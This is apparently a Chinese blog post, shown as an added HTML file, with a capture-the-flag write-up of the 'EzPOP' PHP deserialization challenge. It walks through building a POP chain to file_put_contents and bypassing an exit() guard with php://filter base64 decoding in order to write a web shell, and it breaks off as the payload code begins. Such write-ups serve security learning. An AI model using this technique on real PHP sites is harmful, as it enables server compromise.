@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>[题目复现] - [EIS 2019]EzPOP | C0r1&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">c0r1&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">c0r1&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">[题目复现] - [EIS 2019]EzPOP</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">c0r1</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 7, 2020&nbsp;&nbsp;23:32:11</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h1><p>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6784;&#x9020; POP &#x94FE; + &#x7ED5;&#x8FC7; &#x201C;&#x6B7B;&#x4EA1;exit&#x201D; &#x7684;&#x9898;&#x76EE;&#xFF0C;&#x611F;&#x89C9;&#x86EE;&#x6709;&#x610F;&#x601D;&#x7684;&#xFF0C;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;</p>
+<h1 id="EzPOP"><a href="#EzPOP" class="headerlink" title="EzPOP"></a>EzPOP</h1><p>&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x6E90;&#x7801;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($store, $key = <span class="string">&apos;flysystem&apos;</span>, $expire = null)</span> </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span><span class="params">(array $contents)</span> </span>{</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">&apos;path&apos;</span>, <span class="string">&apos;dirname&apos;</span>, <span class="string">&apos;basename&apos;</span>, <span class="string">&apos;extension&apos;</span>, <span class="string">&apos;filename&apos;</span>,</span><br><span class="line">            <span class="string">&apos;size&apos;</span>, <span class="string">&apos;mimetype&apos;</span>, <span class="string">&apos;visibility&apos;</span>, <span class="string">&apos;timestamp&apos;</span>, <span class="string">&apos;type&apos;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) {</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) {</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span><span class="params">()</span> </span>{</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>{</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) {</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span><span class="params">($expire)</span>: <span class="title">int</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> (int) $expire;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">(string $name)</span>: <span class="title">string</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">&apos;prefix&apos;</span>] . $name;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($data)</span>: <span class="title">string</span> </span>{</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) {</span><br><span class="line">            <span class="keyword">return</span> (string) $data;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">&apos;serialize&apos;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span>: <span class="title">bool</span></span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) {</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">&apos;expire&apos;</span>];</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) {</span><br><span class="line">            <span class="keyword">try</span> {</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">            } <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) {</span><br><span class="line">                <span class="comment">// &#x521B;&#x5EFA;&#x5931;&#x8D25;</span></span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&apos;data_compress&apos;</span>] &amp;&amp; function_exists(<span class="string">&apos;gzcompress&apos;</span>)) {</span><br><span class="line">            <span class="comment">//&#x6570;&#x636E;&#x538B;&#x7F29;</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&apos;%012d&apos;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) {</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&apos;src&apos;</span>]))</span><br><span class="line">{</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">{</span><br><span class="line">    mkdir($dir);</span><br><span class="line">}</span><br><span class="line">unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>&#x5927;&#x81F4;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x89C9;&#x5F97;&#x662F;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65B9;&#x5411;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x987A;&#x7740;&#x601D;&#x8DEF;&#x627E;&#x4E0B;&#x53BB;&#xFF0C;&#x80FD;&#x5229;&#x7528;&#x7684;&#x9B54;&#x6CD5;&#x51FD;&#x6570;&#x53EA;&#x6709; <code>A::__destruct()</code>&#xFF0C;&#x5C06;&#x5176;&#x79F0;&#x4E3A; <code>sources</code>&#xFF08;<strong>&#x6E90;</strong>&#xFF09;&#x3002;&#x53EF;&#x80FD;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x654F;&#x611F;&#x51FD;&#x6570;&#xFF1A;B &#x7C7B; <code>set()</code> &#x4E2D;&#x7684; <code>file_put_contents()</code>&#xFF0C;&#x5C06;&#x5176;&#x79F0;&#x4E3A; <code>sinks</code>&#xFF08;<strong>&#x63A5;&#x6536;&#x5668;</strong>&#xFF09;&#xFF0C;&#x5148;&#x5206;&#x6790;&#x4E00;&#x4E0B; <code>file_put_contents()</code> &#x51FD;&#x6570;&#x662F;&#x5426;&#x6EE1;&#x8DB3;&#x5229;&#x7528;&#x6761;&#x4EF6;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&apos;%012d&apos;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">$result = file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure>
+
+<p>&#x5728; exit() &#x4EE3;&#x7801;&#x540E;&#x9762;&#x62FC;&#x63A5; <code>$data</code> &#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x7684;&#x5229;&#x7528;&#x597D;&#x50CF;&#x4E0D;&#x4E45;&#x524D;&#x89C1; P &#x725B;&#x63D0;&#x8FC7;&#x4E00;&#x6B21;&#xFF0C;&#x7FFB;&#x4E86;&#x4E00;&#x4E0B;&#x679C;&#x7136;&#x53D1;&#x73B0;&#x5229;&#x7528;&#x601D;&#x8DEF;&#xFF1A;<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">&#x8C08;&#x4E00;&#x8C08;php://filter&#x7684;&#x5999;&#x7528;</a></p>
+<p>&#x6587;&#x4E2D;<strong>&#x5DE7;&#x7528;&#x7F16;&#x7801;&#x4E0E;&#x89E3;&#x7801;&#x5E2E;&#x52A9;&#x6211;&#x4EEC;&#x83B7;&#x53D6;&#x6587;&#x4EF6;&#x548C;&#x53BB;&#x9664;&#x4E00;&#x4E9B;&#x201C;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x9EBB;&#x70E6;&#x201D;</strong></p>
+<blockquote>
+<p>&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x5728;&#x5B9E;&#x6218;&#x4E2D;&#x5341;&#x5206;&#x5E38;&#x89C1;&#xFF0C;&#x901A;&#x5E38;&#x51FA;&#x73B0;&#x5728;&#x7F13;&#x5B58;&#x3001;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7B49;&#x7B49;&#x5730;&#x65B9;&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x90FD;&#x4F1A;&#x88AB;&#x52A0;&#x4E0A;if(!defined(xxx))exit;&#x4E4B;&#x7C7B;&#x7684;&#x9650;&#x5236;</p>
+</blockquote>
+<p>&#x8FD9;&#x91CC;&#x601D;&#x8DEF;&#x662F;<strong>&#x5229;&#x7528; <code>php://filter</code> &#x63D0;&#x4F9B;&#x7684;&#x5404;&#x79CD;&#x51FD;&#x6570;&#x53BB;&#x9664; &#x201C;&#x6B7B;&#x4EA1;exit&#x201D;</strong></p>
+<p>&#x63A5;&#x4E0B;&#x6765;&#x5F00;&#x59CB;&#x5BFB;&#x627E; POP &#x94FE;&#xFF0C;&#x53EA;&#x6709;&#x4E24;&#x4E2A;&#x7C7B;&#xFF0C;&#x94FE;&#x5B50;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x597D;&#x627E;&#x7684;</p>
+<p><img src="/2020/04/07/&#x9898;&#x76EE;&#x590D;&#x73B0;-EIS-2019-EzPOP/POP-Chain.png" alt="image"></p>
+<p>&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5C06; <code>$this-&gt;store</code> &#x8BBE;&#x7F6E;&#x6210; B &#x7C7B;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x6210;&#x529F;&#x89E6;&#x53D1; B &#x7C7B;&#x7684; set() &#x65B9;&#x6CD5;</p>
+<p><code>$filename</code> &#x7531; <code>B::getCacheKey()</code> &#x62FC;&#x63A5; <code>$this-&gt;options[&apos;prefix&apos;]</code> &#x548C; <code>$name</code> &#x540E;&#x8FD4;&#x56DE;&#xFF0C;<code>$name</code> &#x5BF9;&#x5E94; A &#x7C7B;&#x7684; <code>$this-&gt;key</code>&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x63A7;&#x5236; <code>$filename</code> &#x503C;</p>
+<p><code>$data</code> &#x7531;&#x81EA;&#x5B9A;&#x4E49;&#x7684; <code>B::serialize()</code> &#x5904;&#x7406; <code>$value</code> &#x540E;&#x8FD4;&#x56DE;&#xFF0C;&#x82E5; <code>$value</code> &#x4E0D;&#x662F;&#x6570;&#x5B57;&#x6216;&#x6570;&#x5B57;&#x5B57;&#x7B26;&#x4E32;&#x5C31;&#x8C03;&#x7528; <code>$this-&gt;options[&apos;serialize&apos;]($value)</code>&#xFF0C;&#x8FD9;&#x91CC; <code>options[&apos;serialize&apos;]</code> &#x662F;&#x53EF;&#x63A7;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x4EFB;&#x610F;&#x51FD;&#x6570;&#xFF0C;<code>$value</code> &#x5BF9;&#x5E94; A &#x7C7B;&#x7684; <code>$contents</code></p>
+<p><code>$contents</code> &#x662F;&#x7531; <code>A::getForStorage()</code> &#x8FD4;&#x56DE;&#x7684; JSON &#x683C;&#x5F0F;&#x6570;&#x636E;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line">json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br></pre></td></tr></table></figure>
+
+<p><code>$cleaned</code> &#x7531; <code>A::cleanContents()</code> &#x8FD4;&#x56DE;&#xFF0C;&#x53C2;&#x6570;&#x9700;&#x8981;&#x4E3A;&#x6570;&#x7EC4;&#xFF0C;&#x4F1A;&#x5BF9;&#x6570;&#x7EC4;&#x4E2D; Value &#x4E3A;&#x6570;&#x7EC4;&#x7684;&#x9879;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x3002;&#x8FD9;&#x91CC;&#x76F4;&#x63A5;&#x8D4B;&#x7A7A;&#x6570;&#x7EC4;&#xFF0C;&#x63A7;&#x5236; <code>$this-&gt;complete</code> &#x4F1A;&#x66F4;&#x65B9;&#x4FBF;</p>
+<p>&#x81F3;&#x6B64;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x63A7;&#x5236; <code>$data</code> &#x503C;&#x4E86;&#xFF0C;&#x5373;&#x4E3A; <code>B::serialize()</code> &#x4E2D;<code>$serialize($data)</code> &#x7684;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#xFF0C;&#x5176;&#x4E2D;</p>
+<ul>
+<li><code>$serialize</code> &#x4E3A;<strong>&#x5B57;&#x7B26;&#x4E32;</strong></li>
+<li><code>$data</code> &#x4E3A; <code>JSON</code> &#x683C;&#x5F0F;&#x6570;&#x636E;</li>
+</ul>
+<p>&#x56E0;&#x6B64; <code>$serialize</code>  &#x53EA;&#x80FD;&#x4E3A;&#x51FD;&#x6570;&#xFF0C;&#x53C8;&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x4F20;&#x5165;&#x7684;&#x6570;&#x636E;&#x5E26;&#x6709;&#x4E0D;&#x5C11;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x3002;&#x56DE;&#x5230;&#x5199; WebShell &#x7684;&#x601D;&#x8DEF;&#xFF0C;P &#x725B;&#x6587;&#x7AE0;&#x4E2D;&#x63D0;&#x8FC7;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; base64 &#x53BB;&#x9664;&#x90E8;&#x5206;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#xFF1A;</p>
+<blockquote>
+<p>&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;base64&#x7F16;&#x7801;&#x4E2D;&#x53EA;&#x5305;&#x542B;64&#x4E2A;&#x53EF;&#x6253;&#x5370;&#x5B57;&#x7B26;&#xFF0C;&#x800C;PHP&#x5728;&#x89E3;&#x7801;base64&#x65F6;&#xFF0C;&#x9047;&#x5230;&#x4E0D;&#x5728;&#x5176;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#x65F6;&#xFF0C;&#x5C06;&#x4F1A;&#x8DF3;&#x8FC7;&#x8FD9;&#x4E9B;&#x5B57;&#x7B26;&#xFF0C;&#x4EC5;&#x5C06;&#x5408;&#x6CD5;&#x5B57;&#x7B26;&#x7EC4;&#x6210;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x8FDB;&#x884C;&#x89E3;&#x7801;&#x3002;</p>
+<p>&#x6240;&#x4EE5;&#xFF0C;&#x4E00;&#x4E2A;&#x6B63;&#x5E38;&#x7684;base64_decode&#x5B9E;&#x9645;&#x4E0A;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x5982;&#x4E0B;&#x4E24;&#x4E2A;&#x6B65;&#x9AA4;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;?php</span></span><br><span class="line">&gt; $_GET[<span class="string">&apos;txt&apos;</span>] = preg_replace(<span class="string">&apos;|[^a-z0-9A-Z+/]|s&apos;</span>, <span class="string">&apos;&apos;</span>, $_GET[<span class="string">&apos;txt&apos;</span>]);</span><br><span class="line">&gt; base64_decode($_GET[<span class="string">&apos;txt&apos;</span>]);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>&#x56E0;&#x6B64;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; <code>base64_decode()</code> &#x9664;&#x53BB; JSON &#x683C;&#x5F0F;&#x4E2D;&#x7684;&#x591A;&#x4F59;&#x7B26;&#x53F7;&#xFF0C;&#x5177;&#x4F53;&#x5229;&#x7528;&#x4E3A;&#xFF1A;</p>
+<ol>
+<li>&#x5C06; <code>$this-&gt;complete</code> &#x8D4B;&#x503C;&#x4E3A; WebShell &#x7684; base64 &#x7F16;&#x7801;</li>
+<li>&#x63A7;&#x5236; <code>$serialize = &quot;lcfirst || ucfirst&quot;</code>&#xFF0C;<del>&#x4FDD;&#x6301;&#x539F;&#x6837;&#x8F93;&#x51FA; <code>$value</code></del>&#xFF08;&#x56E0;&#x4E3A;&#x9700;&#x8981; Padding&#xFF0C;&#x8FD9;&#x91CC;&#x4E24;&#x8005;&#x968F;&#x610F;&#x4F7F;&#x7528;&#xFF0C;&#x5F53;&#x7136;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5176;&#x4F59;&#x51FD;&#x6570;&#xFF0C;&#x5982; base64_decode &#x7B49;&#x7B49;&#xFF09;</li>
+<li>&#x5229;&#x7528; <code>$filename</code> &#x5BF9; <code>$data</code> &#x8FDB;&#x884C; base64 &#x89E3;&#x7801;&#xFF0C;&#x53BB;&#x9664; JSON &#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x4E0E; &#x201C;&#x6B7B;&#x4EA1;exit&#x201C;</li>
+</ol>
+<p>&#x56E0;&#x4E3A; base64 &#x7B97;&#x6CD5;&#x89E3;&#x7801;&#x65F6;&#x662F; 4 &#x4E2A; Byte &#x4E00;&#x7EC4;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x6CE8;&#x610F; Padding</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&apos;%012d&apos;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br></pre></td></tr></table></figure>
+
+<p><code>$data</code> &#x524D;&#x534A;&#x6BB5;&#x7ECF; base64 &#x540E;&#x5C06;&#x53EA;&#x5269;&#x4E0B; 21 &#x4F4D;&#xFF08;3+2+12+4&#xFF09;&#xFF0C;&#x56E0;&#x6B64;<code>$data</code> &#x9700;&#x8981;&#x8865;&#x9F50; 3 &#x4F4D;&#x6570;&#x636E;&#xFF0C;Payload &#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>{</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line">    </span><br><span class="line">    <span 